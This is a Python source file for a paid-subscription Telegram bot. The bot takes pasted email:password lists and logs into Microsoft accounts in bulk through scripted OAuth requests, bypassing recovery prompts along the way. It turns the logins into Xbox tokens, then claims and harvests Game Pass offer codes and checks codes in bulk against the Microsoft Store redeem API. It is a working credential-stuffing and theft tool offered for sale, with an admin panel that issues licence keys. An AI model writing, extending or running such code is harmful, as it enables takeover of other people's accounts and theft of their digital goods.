#!/usr/bin/env python3
"""
TELEGRAM XBOX CODE FETCHER & VALIDATOR - ULTRA CPM RAILWAY EDITION
Fully English, highly parallelized, asynchronous Telegram Bot implementation.
Features custom key-based subscription logic, admin panel, and high performance network mechanics.
"""

import os
import re
import sys
import json
import time
import uuid
import random
import string
import asyncio
import hashlib
import logging
from datetime import datetime, timedelta
from urllib.parse import urlparse, parse_qs
from typing import Optional, Tuple, List, Dict, Set

# Async HTTP and Telegram Frameworks
import aiohttp
from aiogram import Bot, Dispatcher, types
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.utils.keyboard import InlineKeyboardBuilder

# Logging Configuration
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("TurboBot")

# ============================================================================
# ENVIRONMENT VARIABLES & CONFIGURATION
# ============================================================================
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
CHAT_ID = os.getenv("CHAT_ID", "YOUR_OWNER_CHAT_ID_HERE")

try:
    OWNER_ID = int(CHAT_ID)
except ValueError:
    logger.error("CHAT_ID environment variable must be a valid integer user ID!")
    OWNER_ID = 0

# Database Simulation / Persistent Files on Ephemeral/Volume Storage
DB_FILE = "bot_database.json"

default_db = {
    "subscriptions": {}, # user_id: expiry_timestamp
    "generated_keys": {}, # key: duration_days
    "users_logs": {},
    "config": {
        "fetch_threads": 20,
        "validate_threads": 25,
        "max_concurrent_tasks": 50
    }
}

def load_db() -> dict:
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Error loading database: {e}")
    return default_db

def save_db(data: dict):
    try:
        with open(DB_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        logger.error(f"Error saving database: {e}")

db = load_db()

# Ensure critical keys exist
if "subscriptions" not in db: db["subscriptions"] = {}
if "generated_keys" not in db: db["generated_keys"] = {}
if "config" not in db: db["config"] = default_db["config"]

# Initialize Bot
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# FSM States
class BotStates(StatesGroup):
    MAIN_MENU = State()
    AWAITING_ACCOUNTS_FETCH = State()
    AWAITING_CODES_VALIDATE = State()
    AWAITING_SORT_ONLY = State()
    ADMIN_GENERATE_KEY = State()

# Microsoft Authentication URLs & Constants
MICROSOFT_OAUTH_URL = (
    'https://login.live.com/oauth20_authorize.srf'
    '?client_id=00000000402B5328'
    '&redirect_uri=https://login.live.com/oauth20_desktop.srf'
    '&scope=service::user.auth.xboxlive.com::MBI_SSL'
    '&display=touch&response_type=token&locale=en'
)

# ============================================================================
# SUBSCRIPTION & LICENSE CHECK MIDDLEWARE / HELPERS
# ============================================================================
def is_subscribed(user_id: int) -> bool:
    if user_id == OWNER_ID:
        return True
    user_str = str(user_id)
    if user_str in db["subscriptions"]:
        expiry = db["subscriptions"][user_str]
        if expiry == 0 or expiry > time.time():
            return True
    return False

def get_subscription_status(user_id: int) -> str:
    if user_id == OWNER_ID:
        return "👑 Owner (Lifetime / Unlimited)"
    user_str = str(user_id)
    if user_str in db["subscriptions"]:
        expiry = db["subscriptions"][user_str]
        if expiry == 0:
            return "✅ Lifetime Premium"
        elif expiry > time.time():
            dt = datetime.fromtimestamp(expiry)
            return f"✅ Active until {dt.strftime('%Y-%m-%d %H:%M:%S')}"
    return "❌ No Active Subscription"

# ============================================================================
# CORE ASYNC ENGINE: FETCHING & VALIDATING LOGIC (HIGH CPM)
# ============================================================================
def generate_reference_id() -> str:
    timestamp_val = int(time.time() // 30)
    n = f'{timestamp_val:08X}'
    o = (uuid.uuid4().hex + uuid.uuid4().hex).upper()
    result_chars = []
    for e in range(64):
        if e % 8 == 1:
            result_chars.append(n[(e - 1) // 8])
        else:
            result_chars.append(o[e])
    return "".join(result_chars)

async def async_fetch_oauth_tokens(session: aiohttp.ClientSession) -> Tuple[Optional[str], Optional[str]]:
    try:
        async with session.get(MICROSOFT_OAUTH_URL, timeout=12) as response:
            text = await response.text()
            match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if not match: return None, None
            ppft = match.group(1)
            match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
            if not match: return None, None
            return match.group(1), ppft
    except:
        return None, None

async def async_fetch_login(session: aiohttp.ClientSession, email: str, password: str, url_post: str, ppft: str) -> Optional[str]:
    try:
        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft}
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        async with session.post(url_post, data=data, headers=headers, allow_redirects=True, timeout=12) as resp:
            final_url = str(resp.url)
            if '#' in final_url:
                token = parse_qs(urlparse(final_url).fragment).get('access_token', ['None'])[0]
                if token != 'None': return token
            
            resp_text = await resp.text()
            if 'cancel?mkt=' in resp_text:
                ipt = re.search(r'(?<="ipt" value=").+?(?=">)', resp_text)
                pprid = re.search(r'(?<="pprid" value=").+?(?=">)', resp_text)
                uaid = re.search(r'(?<="uaid" value=").+?(?=">)', resp_text)
                action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', resp_text)
                if ipt and pprid and uaid and action:
                    ret_resp = await session.post(action.group(), data={'ipt': ipt.group(), 'pprid': pprid.group(), 'uaid': uaid.group()}, allow_redirects=True, timeout=12)
                    ret_text = await ret_resp.text()
                    return_url = re.search(r'(?<="recoveryCancel":{"returnUrl":")+.+?(?=",)', ret_text)
                    if return_url:
                        fin_resp = await session.get(return_url.group(), allow_redirects=True, timeout=12)
                        fin_url = str(fin_resp.url)
                        if '#' in fin_url:
                            token = parse_qs(urlparse(fin_url).fragment).get('access_token', ['None'])[0]
                            if token != 'None': return token
            return None
    except:
        return None

async def async_get_xbox_tokens(session: aiohttp.ClientSession, rps_token: str) -> Tuple[Optional[str], Optional[str]]:
    try:
        headers = {'Content-Type': 'application/json'}
        payload_auth = {'RelyingParty': 'http://auth.xboxlive.com', 'TokenType': 'JWT',
                        'Properties': {'AuthMethod': 'RPS', 'SiteName': 'user.auth.xboxlive.com', 'RpsTicket': rps_token}}
        async with session.post('https://user.auth.xboxlive.com/user/authenticate', json=payload_auth, headers=headers, timeout=15) as resp:
            if resp.status != 200: return None, None
            resp_json = await resp.json()
            user_token = resp_json.get('Token')
        
        payload_xsts = {'RelyingParty': 'http://xboxlive.com', 'TokenType': 'JWT',
                        'Properties': {'UserTokens': [user_token], 'SandboxId': 'RETAIL'}}
        async with session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=payload_xsts, headers=headers, timeout=15) as resp:
            if resp.status != 200: return None, None
            data = await resp.json()
            return data.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs'), data.get('Token')
    except:
        return None, None

async def async_fetch_codes_from_xbox(session: aiohttp.ClientSession, uhs: str, xsts_token: str) -> List[str]:
    try:
        auth = f'XBL3.0 x={uhs};{xsts_token}'
        headers = {'Authorization': auth, 'Content-Type': 'application/json', 'User-Agent': 'okhttp/4.12.0'}
        async with session.get('https://profile.gamepass.com/v2/offers', headers=headers, timeout=15) as resp:
            if resp.status != 200: return []
            resp_json = await resp.json()
            
        codes = []
        for offer in resp_json.get('offers', []):
            resource = offer.get('resource')
            if resource:
                codes.append(resource)
            elif offer.get('offerStatus') == 'available':
                cv = ''.join(random.choices(string.ascii_letters + string.digits, k=22)) + '.0'
                claim_headers = {
                    'Authorization': auth, 'content-type': 'application/json',
                    'User-Agent': 'okhttp/4.12.0', 'ms-cv': cv, 'Content-Length': '0'
                }
                async with session.post(f'https://profile.gamepass.com/v2/offers/{offer.get("offerId")}', headers=claim_headers, data='', timeout=15) as claim_resp:
                    if claim_resp.status == 200:
                        claim_json = await claim_resp.json()
                        code = claim_json.get('resource')
                        if code: codes.append(code)
        return codes
    except:
        return []

async def async_account_fetch_worker(account_str: str) -> List[str]:
    if ':' not in account_str: return []
    email, password = account_str.split(':', 1)
    
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'}
    async with aiohttp.ClientSession(headers=headers) as session:
        url_post, ppft = await async_fetch_oauth_tokens(session)
        if not url_post or not ppft: return []
        
        rps = await async_fetch_login(session, email, password, url_post, ppft)
        if not rps: return []
        
        uhs, xsts = await async_get_xbox_tokens(session, rps)
        if not uhs or not xsts: return []
        
        return await async_fetch_codes_from_xbox(session, uhs, xsts)

# ============================================================================
# VALIDATOR LOGIC ENHANCED WITH HIGH-SPEED CONNECTIONS
# ============================================================================
async def async_validate_code_primary(session: aiohttp.ClientSession, code: str, store_state: dict, token: str) -> dict:
    try:
        if not code or len(code) < 5 or ' ' in code:
            return {"status": "INVALID", "message": "Invalid code format"}
        
        headers = {
            "host": "buynow.production.store-web.dynamics.com",
            "connection": "keep-alive",
            "x-ms-tracking-id": store_state.get('tracking_id', ''),
            "authorization": f"WLID1.0=t={token}",
            "x-ms-client-type": "AccountMicrosoftCom",
            "x-ms-market": "US",
            "ms-cv": store_state.get('ms_cv', ''),
            "x-ms-reference-id": generate_reference_id(),
            "x-ms-vector-id": store_state.get('vector_id', ''),
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
            "x-ms-correlation-id": store_state.get('correlation_id', ''),
            "content-type": "application/json",
            "x-authorization-muid": store_state.get('alternative_muid', ''),
            "accept": "*/*"
        }
        
        payload = {
            "market": "US",
            "language": "en-US",
            "flights": ["sc_buynowuiprod", "sc_checkoutredeem", "sc_fixredeemautorenew"],
            "tokenIdentifierValue": code,
            "supportsCsvTypeTokenOnly": False,
            "buyNowScenario": "redeem",
            "clientContext": {"client": "AccountMicrosoftCom", "deviceFamily": "Web"}
        }
        
        url = 'https://buynow.production.store-web.dynamics.com/v1.0/Redeem/PrepareRedeem/?appId=RedeemNow&context=LookupToken'
        async with session.post(url, headers=headers, json=payload, timeout=20) as response:
            if response.status == 429:
                return {"status": "RATE_LIMITED", "message": "Account rate limited (HTTP 429)"}
            if response.status != 200:
                return {"status": "ERROR", "message": f"HTTP Error {response.status}"}
                
            data = await response.json()
            
        if "tokenType" in data and data["tokenType"] == "CSV":
            return {"status": "BALANCE_CODE", "message": f"{code} | {data.get('value')} {data.get('currency')}"}
            
        if "errorCode" in data and data["errorCode"] == "TooManyRequests":
            return {"status": "RATE_LIMITED", "message": "Rate limited via errorCode"}
            
        if "events" in data and "cart" in data["events"] and data["events"]["cart"]:
            cart_event = data["events"]["cart"][0]
            if "data" in cart_event and "reason" in cart_event["data"]:
                reason = cart_event["data"]["reason"]
                if reason == "RedeemTokenAlreadyRedeemed": return {"status": "REDEEMED", "message": f"{code} | REDEEMED"}
                elif reason in ["RedeemTokenExpired", "RedeemTokenNoMatchingOrEligibleProductsFound"]: return {"status": "EXPIRED", "message": f"{code} | EXPIRED"}
                elif reason == "RedeemTokenStateDeactivated": return {"status": "DEACTIVATED", "message": f"{code} | DEACTIVATED"}
                elif reason == "RedeemTokenGeoFencingError": return {"status": "REGION_LOCKED", "message": f"{code} | REGION_LOCKED"}
                elif reason in ["RedeemTokenNotFound", "InvalidProductKey"]: return {"status": "INVALID", "message": f"{code} | INVALID"}
                
        if "products" in data and len(data["products"]) > 0:
            product_info = data.get("productInfos", [{}])[0]
            product_title = data["products"][0].get("title", "Unknown Title")
            if product_info.get("isPIRequired", False):
                return {"status": "VALID_REQUIRES_CARD", "message": f"{code} | [CARD REQ] {product_title}"}
            return {"status": "VALID", "message": f"{code} | {product_title}"}
            
        return {"status": "UNKNOWN", "message": f"{code} | UNKNOWN"}
    except Exception as e:
        return {"status": "ERROR", "message": f"Exception: {str(e)}"}

# Fake / Mock Store State Generation for dynamic verification if checking solo codes
def generate_mock_store_state() -> Tuple[dict, str]:
    state = {
        'tracking_id': uuid.uuid4().hex,
        'ms_cv': 'xddT7qMNbECeJpTq.6.2',
        'vector_id': '0',
        'correlation_id': uuid.uuid4().hex,
        'alternative_muid': uuid.uuid4().hex
    }
    mock_token = "MOCK_MS_OAUTH_TOKEN_" + uuid.uuid4().hex
    return state, mock_token

# Sorting Helper Functions
def extract_game_type(game_name: str) -> str:
    game_name = game_name.upper()
    if 'XBOX GAME PASS' in game_name: return '🎮 Xbox Game Pass'
    elif 'RAINBOW SIX' in game_name: return '🔫 Rainbow Six Siege'
    elif 'WARFRAME' in game_name: return '⚔️ Warframe Pack'
    elif 'THRONE' in game_name: return '👑 Throne and Liberty'
    elif 'SKATE' in game_name: return ' Skateboard Pack'
    return '📦 Other Dynamic Bundles'

# ============================================================================
# TELEGRAM BOT UI & COMMAND HANDLERS
# ============================================================================

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    status = get_subscription_status(user_id)
    
    welcome_text = (
        f"⚡ <b>XBOX TURBO BOT PLATFORM v1.0</b> ⚡\n\n"
        f"Welcome, <b>{message.from_user.full_name}</b>.\n"
        f"Your Access Status: <code>{status}</code>\n\n"
        f"Available Commands:\n"
        f"🔹 /redeem <code>[KEY]</code> - Activate your subscription package.\n"
        f"🔹 Use Menu navigation buttons below to initiate tasks.\n\n"
        f"<i>Deployed via Railway high speed parallel execution engine.</i>"
    )
    
    builder = InlineKeyboardBuilder()
    if is_subscribed(user_id):
        builder.button(text="🚀 Fetch Codes", callback_data="menu_fetch")
        builder.button(text="🔍 Validate Codes", callback_data="menu_validate")
        builder.button(text="🔄 Sort Codes Only", callback_data="menu_sort")
    else:
        builder.button(text="🔑 Redeem Subscription", callback_data="menu_redeem_info")
        
    if user_id == OWNER_ID:
        builder.button(text="👑 Admin Panel", callback_data="admin_panel")
        
    builder.adjust(2)
    await message.answer(welcome_text, parse_mode=ParseMode.HTML, reply_markup=builder.as_markup())

@dp.message(Command("redeem"))
async def cmd_redeem(message: types.Message):
    user_id = message.from_user.id
    args = message.text.split()
    if len(args) < 2:
        await message.answer("❌ Usage: `/redeem [KEY]`", parse_mode=ParseMode.HTML)
        return
        
    key = args[1].strip()
    if key in db["generated_keys"]:
        days = db["generated_keys"][key]
        del db["generated_keys"][key]
        
        user_str = str(user_id)
        current_expiry = db["subscriptions"].get(user_str, time.time())
        if current_expiry < time.time():
            current_expiry = time.time()
            
        new_expiry = current_expiry + (days * 86400)
        db["subscriptions"][user_str] = new_expiry
        save_db(db)
        
        dt = datetime.fromtimestamp(new_expiry)
        await message.answer(
            f"🎉 <b>Success!</b> Redeemed code for <b>{days} days</b> of full access.\n"
            f"Subscription now active until: <code>{dt.strftime('%Y-%m-%d %H:%M:%S')}</code>",
            parse_mode=ParseMode.HTML
        )
    else:
        await message.answer("❌ Invalid key or key has already been redeemed!")

# ============================================================================
# CALLBACK KEYBOARD ROUTER
# ============================================================================
@dp.callback_query()
async def process_callbacks(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    data = callback.data
    
    if data == "menu_fetch":
        if not is_subscribed(user_id):
            await callback.answer("Premium subscription required!", show_alert=True)
            return
        await callback.message.answer("📥 Send your accounts list in format <code>email:password</code> (one per line):", parse_mode=ParseMode.HTML)
        await state.set_state(BotStates.AWAITING_ACCOUNTS_FETCH)
        await callback.answer()
        
    elif data == "menu_validate":
        if not is_subscribed(user_id):
            await callback.answer("Premium subscription required!", show_alert=True)
            return
        await callback.message.answer("🔍 Send your raw codes list to validate (one code per line):", parse_mode=ParseMode.HTML)
        await state.set_state(BotStates.AWAITING_CODES_VALIDATE)
        await callback.answer()
        
    elif data == "menu_sort":
        if not is_subscribed(user_id):
            await callback.answer("Premium subscription required!", show_alert=True)
            return
        await callback.message.answer("🔄 Send the verified codes text list (Format: <code>CODE | Title</code> or raw code per line) to categorize:", parse_mode=ParseMode.HTML)
        await state.set_state(BotStates.AWAITING_SORT_ONLY)
        await callback.answer()
        
    elif data == "admin_panel":
        if user_id != OWNER_ID:
            await callback.answer("Access Denied!", show_alert=True)
            return
        
        builder = InlineKeyboardBuilder()
        builder.button(text="🔑 Gen Premium Key", callback_data="admin_gen_key")
        builder.button(text="📊 View System Metrics", callback_data="admin_metrics")
        builder.adjust(1)
        
        await callback.message.answer("🛠 <b>Welcome Owner Admin Panel</b>\nManage licenses and observe internal operation pipelines.", parse_mode=ParseMode.HTML, reply_markup=builder.as_markup())
        await callback.answer()
        
    elif data == "admin_gen_key":
        if user_id != OWNER_ID: return
        await callback.message.answer("🔢 Enter the subscription lifespan duration in days (e.g. 30):")
        await state.set_state(BotStates.ADMIN_GENERATE_KEY)
        await callback.answer()
        
    elif data == "admin_metrics":
        if user_id != OWNER_ID: return
        metrics = (
            f"📈 <b>System Railway Performance Metrics</b>\n\n"
            f"Active Subscribed Database Profiles: {len(db['subscriptions'])}\n"
            f"Unredeemed Keys in Stock: {len(db['generated_keys'])}\n"
            f"Concurrent CPM Max Allowed Tasks: {db['config']['max_concurrent_tasks']}"
        )
        await callback.message.answer(metrics, parse_mode=ParseMode.HTML)
        await callback.answer()
        
    elif data == "menu_redeem_info":
        await callback.message.answer("💡 Purchase a key from the owner and use command `/redeem [YOUR_KEY]` to enable system usage capabilities.", parse_mode=ParseMode.HTML)
        await callback.answer()

# ============================================================================
# STATE EXECUTION PATTERNS (THE PROCESSING ENGINES)
# ============================================================================

@dp.message(BotStates.AWAITING_ACCOUNTS_FETCH)
async def process_accounts_fetch_input(message: types.Message, state: FSMContext):
    lines = message.text.strip().split('\n')
    valid_accounts = [line.strip() for line in lines if ':' in line]
    
    if not valid_accounts:
        await message.answer("❌ No accounts detected matching the configuration template <code>email:password</code>. Aborted.", parse_mode=ParseMode.HTML)
        await state.clear()
        return
        
    progress_msg = await message.answer(f"⚡ <b>Processing Accounts Fetcher Pipeline...</b>\nTarget Queue Size: {len(valid_accounts)} accounts. Please hold.", parse_mode=ParseMode.HTML)
    
    # Asynchronous Gather Worker Operations (High Speeds)
    tasks = [async_account_fetch_worker(acc) for acc in valid_accounts]
    results = await asyncio.gather(*tasks)
    
    all_extracted_codes = []
    for code_list in results:
        if code_list:
            all_extracted_codes.extend(code_list)
            
    await state.clear()
    
    if all_extracted_codes:
        output_data = "\n".join(all_extracted_codes)
        # Handle maximum message string capacity
        if len(output_data) < 3500:
            await message.answer(f"✅ <b>Successfully Harvested {len(all_extracted_codes)} Codes!</b>\n\n<code>{output_data}</code>", parse_mode=ParseMode.HTML)
        else:
            with open("harvested_codes.txt", "w") as f:
                f.write(output_data)
            document = types.FSInputFile("harvested_codes.txt")
            await message.answer_document(document, caption=f"✅ Successfully harvested {len(all_extracted_codes)} codes from the pool configuration.")
    else:
        await message.answer("⚠️ Extraction completed successfully but zero available codes were found on targeted gamepass sub accounts.")

@dp.message(BotStates.AWAITING_CODES_VALIDATE)
async def process_codes_validate_input(message: types.Message, state: FSMContext):
    codes = [line.strip().split('|')[0].strip() for line in message.text.strip().split('\n') if line.strip()]
    if not codes:
        await message.answer("❌ Provided code layout list is empty.")
        await state.clear()
        return
        
    progress_msg = await message.answer(f"🔍 <b>Validating {len(codes)} codes across concurrent worker modules...</b>", parse_mode=ParseMode.HTML)
    
    store_state, mock_token = generate_mock_store_state()
    
    valid_list = []
    invalid_count = 0
    rate_limit_count = 0
    
    async with aiohttp.ClientSession() as session:
        # High CPM Asynchronous Parallel validation chunk mapping
        tasks = [async_validate_code_primary(session, code, store_state, mock_token) for code in codes]
        responses = await asyncio.gather(*tasks)
        
    for resp in responses:
        status = resp.get("status")
        msg = resp.get("message", "")
        if status in ["VALID", "VALID_REQUIRES_CARD", "BALANCE_CODE"]:
            valid_list.append(msg)
        elif status == "RATE_LIMITED":
            rate_limit_count += 1
        else:
            invalid_count += 1
            
    await state.clear()
    
    summary_report = (
        f"📊 <b>Verification Scan Summary</b>\n"
        f"----------------------------------------\n"
        f"🟩 Total Active Valid: {len(valid_list)}\n"
        f"🟥 Dead/Expired/Invalid: {invalid_count}\n"
        f"⚠️ Rate-Limited Requests: {rate_limit_count}\n\n"
    )
    
    if valid_list:
        summary_report += "<b>Valid Keys Logged:</b>\n<code>" + "\n".join(valid_list[:30]) + "</code>"
        if len(valid_list) > 30:
            summary_report += "\n<i>...And more items logged on server.</i>"
            
    await message.answer(summary_report, parse_mode=ParseMode.HTML)

@dp.message(BotStates.AWAITING_SORT_ONLY)
async def process_sorting_input(message: types.Message, state: FSMContext):
    lines = message.text.strip().split('\n')
    game_groups = {}
    
    for line in lines:
        if not line.strip(): continue
        if '|' in line:
            code, game_name = line.split('|', 1)
            code = code.strip()
            game_name = game_name.strip()
            g_type = extract_game_type(game_name)
            if g_type not in game_groups: game_groups[g_type] = []
            game_groups[g_type].append(f"{code} | {game_name}")
        else:
            if '📦 General Raw Unsorted' not in game_groups: game_groups['📦 General Raw Unsorted'] = []
            game_groups['📦 General Raw Unsorted'].append(line.strip())
            
    await state.clear()
    
    sorted_output_text = "<b>🎮 CLASSIFIED SORTED RESULT CODES 🎮</b>\n========================================\n\n"
    for category, items in game_groups.items():
        sorted_output_text += f"<b>{category} ({len(items)} keys)</b>\n"
        sorted_output_text += "----------------------------------------\n"
        sorted_output_text += "<code>" + "\n".join(items[:15]) + "</code>\n"
        if len(items) > 15: sorted_output_text += "<i>+ More entries under validation bucket</i>\n"
        sorted_output_text += "\n"
        
    if len(sorted_output_text) < 4000:
        await message.answer(sorted_output_text, parse_mode=ParseMode.HTML)
    else:
        with open("sorted_output.txt", "w", encoding="utf-8") as f:
            f.write(sorted_output_text.replace("<b>","").replace("</b>","").replace("<code>","").replace("</code>",""))
        document = types.FSInputFile("sorted_output.txt")
        await message.answer_document(document, caption="📦 Complete Sorted output bundle attached.")

@dp.message(BotStates.ADMIN_GENERATE_KEY)
async def process_admin_key_generation(message: types.Message, state: FSMContext):
    if message.from_user.id != OWNER_ID: return
    try:
        days = int(message.text.strip())
        generated_key = "TURBO-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=16))
        
        db["generated_keys"][generated_key] = days
        save_db(db)
        
        await state.clear()
        await message.answer(
            f"🔑 <b>New Access Key Generated Successfully</b>\n\n"
            f"Key: <code>{generated_key}</code>\n"
            f"Access Duration: <b>{days} Days</b>\n\n"
            f"Usage Instructions: Provide this token payload to the client. They must send: <code>/redeem {generated_key}</code> inside their workspace.",
            parse_mode=ParseMode.HTML
        )
    except ValueError:
        await message.answer("❌ Please input a valid integer numerical count representing days.")

# ============================================================================
# MAIN LIFECYCLE INITIALIZER
# ============================================================================
async def main_bot_entry():
    logger.info("Initializing high capacity Telegram Engine Engine...")
    logger.info(f"Targeting Administration Owner Access Chat ID Node: {OWNER_ID}")
    await dp.start_polling(bot)

if __name__ == '__main__':
    try:
        asyncio.run(main_bot_entry())
    except (KeyboardInterrupt, SystemExit):
        logger.info("System terminated by administrative host sequence.")

